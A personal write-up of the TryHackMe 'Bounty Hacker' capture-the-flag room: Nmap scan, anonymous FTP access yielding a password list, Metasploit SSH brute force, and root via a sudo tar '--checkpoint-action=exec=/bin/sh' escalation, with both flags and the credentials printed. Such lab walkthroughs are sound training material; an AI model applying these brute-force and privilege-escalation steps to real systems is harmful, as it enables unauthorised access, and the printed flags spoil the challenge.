- - - 
lecreated : 17-07-2025 

Tags : #easy  
- - - 
# Objective


[Bug Bounty](../../3%20-%20Tags/Hacking%20Concepts/Bug%20Bounty.md) [CTF](../../3%20-%20Tags/Hacking%20Concepts/CTF.md)
# Scenario

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

# Recon
## Nmap

We add the host in /etc/hosts and scan with [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ nmap -p 20,21,22,80,990 -A bounty.thm -v -Pn
          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 16:39 CEST
Nmap scan report for bounty.thm (10.10.58.207)
Host is up (0.097s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT    STATE    SERVICE  VERSION
20/tcp  filtered ftp-data
21/tcp  filtered ftp
22/tcp  filtered ssh
80/tcp  filtered http
990/tcp filtered ftps

Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds

```

# Enumeration
## FTP

Let's try if we can access anonymous in [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) :

```
┌──(mdn0x㉿mdn0xKali)-[/home/mdn0x]
└─# ftp bounty.thm
Connected to bounty.thm.
220 (vsFTPd 3.0.3)
Name (bounty.thm:mdn0x): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

And we are in, we can type passive if it's not automated to unblock it and view what's there :

```
┌──(mdn0x㉿mdn0xKali)-[/home/mdn0x]
└─# ftp bounty.thm
Connected to bounty.thm.
220 (vsFTPd 3.0.3)
Name (bounty.thm:mdn0x): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8966|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.

```

Now let's directly read these with `get name -` :

```
ftp> get locks.txt -
remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
226 Transfer complete.
418 bytes received in 00:00 (7.17 KiB/s)

```

These looks like passwords .

```
ftp> get task.txt -
remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
226 Transfer complete.
68 bytes received in 00:00 (1.21 KiB/s)

```

So we have a username : **lin.**

We can download them in our directory with a simple `get <filename>` .

## SSH

Now we can try [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with these credentials, we can use **[Hydra](../../3%20-%20Tags/Hacking%20Tools/Hydra.md)** or <span style="color: rgb(224, 62, 45);">**Metasploit**</span> 

### [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md)

We search for **ssh_login**, select <span style="color: rgb(224, 62, 45);">scanner/ssh/ssh_login</span> and set options :

```
msf6 auxiliary(scanner/ssh/ssh_login) > options
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /home/mdn0x/THM/CHALLENGES/Easy/Bounty/locks.txt
pass_file => /home/mdn0x/THM/CHALLENGES/Easy/Bounty/locks.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts bounty.thm
rhosts => bounty.thm
msf6 auxiliary(scanner/ssh/ssh_login) > set username lin
username => lin
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssh/ssh_login) > run

```

Now we wait for the result :

![c06e4e64ab34897a8b3162d5fd80ee1d.png](../../2%20-%20Resources/Others/Flameshots/c06e4e64ab34897a8b3162d5fd80ee1d.png)

Now we can connect with **lin : <span style="color: rgb(45, 194, 107);">RedDr4gonSynd1cat3</span>**

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Bounty]
└─$ ssh lin@bounty.thm       
The authenticity of host 'bounty.thm (10.10.58.207)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bounty.thm' (ED25519) to the list of known hosts.
lin@bounty.thm's password: 
Permission denied, please try again.
lin@bounty.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}

```

## HTTP (80)

<img src="../../2%20-%20Resources/Others/Flameshots/23662abdc395d0c0c864d28502cabaae.png" alt="23662abdc395d0c0c864d28502cabaae.png" width="597" height="296" class="jop-noMdConv">

# Privilege Escalation

We check for sudo commands for the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md):

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

Probably our initial attack vector.

## GTFObins

We search in [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) for tar :

<img src="../../2%20-%20Resources/Others/Flameshots/5153273165b1c8ae2f19b9e68f7feaa1.png" alt="5153273165b1c8ae2f19b9e68f7feaa1.png" width="573" height="104">

Now we go in bin cause tar it's there and paste the command ;  
<br/>

```
lin@bountyhacker:~/Desktop$ cd bin
-bash: cd: bin: No such file or directory
lin@bountyhacker:~/Desktop$ cd /bin/
lin@bountyhacker:/bin$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
[sudo] password for lin: 
tar: Removing leading `/' from member names

# whoami
root
# cd/root/
/bin/sh: 3: cd/root/: not found
# cd ..
# ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
# cd root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}

```

And we have the root flag : THM{80UN7Y_h4cK3r} .

Pwned !!
